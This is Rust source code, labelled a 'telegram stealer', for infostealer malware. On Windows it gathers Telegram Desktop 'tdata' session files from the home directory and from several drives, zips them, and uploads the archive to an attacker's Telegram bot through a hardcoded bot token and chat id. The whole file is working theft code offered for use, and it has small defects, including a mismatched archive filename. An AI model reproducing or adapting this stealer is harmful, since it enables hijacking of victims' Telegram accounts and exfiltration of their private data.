//telegram stealer
use clap::Parser;
use reqwest::blocking::multipart;
use std::env;
use std::fs;
use std::fs::File;
use std::io;
use std::io::prelude::*;
use std::path::Path;
use zip;
use zip::write::FileOptions;

async fn send_to_telegram(file_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    let token = "9999999999:abcdefghijklmnopqrstuvwxyzABCDE12345";
    let chat_id = "-1009999999999";

    let url = format!("https://api.telegram.org/bot{}/sendDocument", token);

    let form = multipart::Form::new()
        .text("chat_id", chat_id.to_string())
        .file("document", file_path)?;

    let client = reqwest::blocking::Client::new();
    let res = client.post(url).multipart(form).send()?;

    if res.status().is_success() {
        println!("");
    } else {
        println!("Ошибка отправки: {:?}", res.text());
    }

    Ok(())
}

#[derive(Parser, Debug)]
#[command()]
struct Args {
    #[arg(short, long, default_value_t = 1)]
    compression: u8,

    #[arg(short, long, default_value_t = 150)]
    max_size: u64,

    #[arg(short, long, default_value_t = true)]
    drives: bool,
}

pub async fn send_tg_trt() -> io::Result<()> {
    let compressions = vec![
        zip::CompressionMethod::Stored,
        zip::CompressionMethod::Deflated,
        zip::CompressionMethod::Bzip2,
    ];

    if env::consts::OS != "windows" {
        return Ok(());
    }

    let args = Args::parse();
    let compression: u8 = args.compression;

    let mut dir_paths = Vec::new();

    if let Some(home) = dirs::home_dir() {
        dir_paths.push(format!(
            "{}\\{}",
            home.to_string_lossy(),
            r"AppData\Roaming\Telegram Desktop\tdata"
        ));
    }

    let target = r"Telegram Desktop\tdata";
    let possible_drives = vec!["C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "J:\\"];

    for drive in possible_drives {
        let path = format!("{}{}", drive, target);
        if Path::new(&path).exists() {
            dir_paths.push(path);
        }
    }

    let max_file_size: u64 = args.max_size * 1024 * 1024;
    let blacklist_dirs = vec![
        ".wrangler",
        ".git",
        "node_modules",
        "user_data",
        "temp",
        "thumbnails",
        "emoji",
    ];

    let mut all_files: Vec<String> = Vec::new();
    let mut file_sizes: u64 = 0;

    fn handle_dir(
        location: &str,
        max_file_size: u64,
        blacklist_dirs: &[&str],
        all_files: &mut Vec<String>,
        file_sizes: &mut u64,
    ) -> io::Result<()> {
        if let Ok(walker) = fs::read_dir(location) {
            for entry in walker {
                if let Ok(entry) = entry {
                    let path = entry.path();
                    let path_str = path.to_string_lossy();

                    if path.is_file() {
                        if path.metadata()?.len() <= max_file_size
                            && !blacklist_dirs.iter().any(|dir| path_str.contains(dir))
                            && !path_str.ends_with(".lock")
                        {
                            all_files.push(path_str.to_string());
                            *file_sizes += path.metadata()?.len();
                        }
                    } else if path.is_dir() {
                        handle_dir(
                            &path_str,
                            max_file_size,
                            blacklist_dirs,
                            all_files,
                            file_sizes,
                        )?;
                    }
                }
            }
        }
        Ok(())
    }

    println!("");
    for location in dir_paths {
        handle_dir(
            &location,
            max_file_size,
            &blacklist_dirs,
            &mut all_files,
            &mut file_sizes,
        )?;
    }

    if all_files.is_empty() {
        println!("");
        return Ok(());
    }

    println!("Zipping {} files...", all_files.len());
    let mut zip = File::create("tdata_backup.zip")?;
    let mut archive = zip::ZipWriter::new(&mut zip);
    let options: FileOptions<()> =
        zip::write::FileOptions::default().compression_method(compressions[compression as usize]);

    for item in all_files.iter() {
        match File::open(item) {
            Ok(mut file) => {
                let archive_name = item.replace(":", "").replace("\\", "/");
                if archive.start_file(archive_name, options).is_err() {
                    continue;
                }

                let mut buffer = Vec::new();
                if file.read_to_end(&mut buffer).is_err() {
                    continue;
                }
                let _ = archive.write_all(&*buffer);
            }
            Err(_) => continue,
        }
    }

    archive.finish()?;

    // ✅ УДАЛЕНО: fs::remove_file("tdata_backup.zip"); — файл теперь остаётся для отправки!
    send_to_telegram("backup.zip").await;

    Ok(())
}
